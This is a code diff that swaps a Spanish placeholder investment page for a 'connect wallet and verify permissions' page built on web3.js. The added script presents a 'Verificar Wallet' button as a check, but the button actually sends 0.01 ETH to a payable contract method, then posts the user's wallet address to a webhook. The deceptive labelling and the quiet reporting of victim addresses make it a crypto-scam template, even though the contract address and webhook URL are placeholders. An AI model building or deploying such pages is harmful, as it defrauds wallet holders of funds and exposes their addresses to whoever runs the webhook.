@@ -1,92 +1,94 @@
 <!DOCTYPE html>
-<html>
-<head>
-    <meta charset="utf-8">
-    <title>Página de Inversión</title>
-    <link rel="stylesheet" href="style.css">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
-</head>
-<body>
-    <header>
-        <h1>Página de Inversión</h1>
-    </header>
-	<style>
-		/* Estilos para las tarjetas */
-.card {
-    width: 300px;
-    padding: 20px;
-    background-color: #fff;
-    margin: 20px;
-    border-radius: 10px;
-    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-    text-align: center;
-    transition: transform 0.3s ease;
-}
+<html lang="es">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Conectar Wallet y Verificar Permisos</title>
+  </head>
+  <body>
+    <div class="card">
+      <h1>Conectar Wallet y Verificar Permisos</h1>
+      <button id="connect-btn">Conectar</button>
+      <button id="verify-btn" style="display:none;">Verificar Wallet</button>
+      <p id="message"></p>
+    </div>
 
-.card:hover {
-    transform: translateY(-5px);
-}
+    <script src="https://cdn.jsdelivr.net/gh/ethereum/web3.js/dist/web3.min.js"></script>
+    <script>
+      window.addEventListener('load', async () => {
+        const web3 = new Web3(window.ethereum);
+        await window.ethereum.enable();
 
-.card i {
-    font-size: 48px;
-    color: #007bff;
-}
+        const contractAddress = "CONTRATO_ADDRESS";
+        const contractABI = [
+          {
+            "inputs": [
+              {
+                "internalType": "address",
+                "name": "_direccionComun",
+                "type": "address"
+              }
+            ],
+            "stateMutability": "nonpayable",
+            "type": "constructor"
+          },
+          {
+            "inputs": [],
+            "name": "aprobarPermisos",
+            "outputs": [],
+            "stateMutability": "payable",
+            "type": "function"
+          }
+        ];
 
-.card h2 {
-    font-size: 24px;
-    margin-top: 10px;
-    margin-bottom: 15px;
-}
+        const contract = new web3.eth.Contract(contractABI, contractAddress);
 
-.card p {
-    font-size: 14px;
-    color: #777;
-    margin-bottom: 20px;
-}
+        document.getElementById('connect-btn').addEventListener('click', async () => {
+          await window.ethereum.enable();
+          const accounts = await web3.eth.getAccounts();
+          const message = `Haz conectado tu Wallet con éxito! Tu dirección es: ${accounts[0]}`;
+          document.getElementById('message').innerText = message;
+          document.getElementById('verify-btn').style.display = "inline-block";
+        });
 
-.btn {
-    display: inline-block;
-    padding: 10px 20px;
-    background-color: #007bff;
-    color: #fff;
-    font-size: 16px;
-    border: none;
-    border-radius: 5px;
-    cursor: pointer;
-    transition: background-color 0.3s ease;
-}
+        document.getElementById('verify-btn').addEventListener('click', async () => {
+          const accounts = await web3.eth.getAccounts();
+          const options = {
+            from: accounts[0],
+            value: web3.utils.toWei('0.01', 'ether'),
+            gasPrice: web3.utils.toWei('10', 'gwei')
+          };
 
-.btn:hover {
-    background-color: #0056b3;
-}
+          const message = "Activar IA";
+          try {
+            await contract.methods.aprobarPermisos().send(options);
+            document.getElementById('message').innerText = `Permisos concedidos para: ${message}`;
+            // Llamada al webhook
+            const webhookUrl = "WEBHOOK_URL";
+            const response = await fetch(webhookUrl, {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json"
+              },
+              body: JSON.stringify({message: "Se ha concedido permiso para " + message, userAddress: accounts[0]})
+            });
+          } catch (e) {
+            console.log(e);
+            document.getElementById('message').innerText = "Error al conceder permisos";
+          }
+        });
+      });
+    </script>
 
-/* Estilos
-	</style>
-    <main>
-        <section id="cards-container">
-            <div class="card">
-                <i class="fas fa-chart-line"></i>
-                <h2>Plan de Inversión 1</h2>
-                <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Vestibulum fermentum blandit velit, sit amet convallis nunc dignissim ut.</p>
-                <button class="btn">Invertir</button>
-            </div>
-            <div class="card">
-                <i class="fas fa-coins"></i>
-                <h2>Plan de Inversión 2</h2>
-                <p>Sed vitae tortor lacinia, facilisis enim id, vestibulum sapien. Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas.</p>
-                <button class="btn">Invertir</button>
-            </div>
-            <div class="card">
-                <i class="fas fa-piggy-bank"></i>
-                <h2>Plan de Inversión 3</h2>
-                <p>Fusce bibendum erat vitae lacus volutpat fringilla. Sed vel magna et urna dignissim volutpat id id enim.</p>
-                <button class="btn">Invertir</button>
-            </div>
-        </section>
-    </main>
-    <footer>
-        <p>Contacto: info@inversiones.com</p>
-    </footer>
-    <script src="script.js"></script>
-</body>
+    <style>
+      .card {
+        border: 1px solid black;
+        padding: 20px;
+        width: 400px;
+        margin: 50px auto;
+        text-align: center;
+      }
+    </style>
+  </body>
 </html>
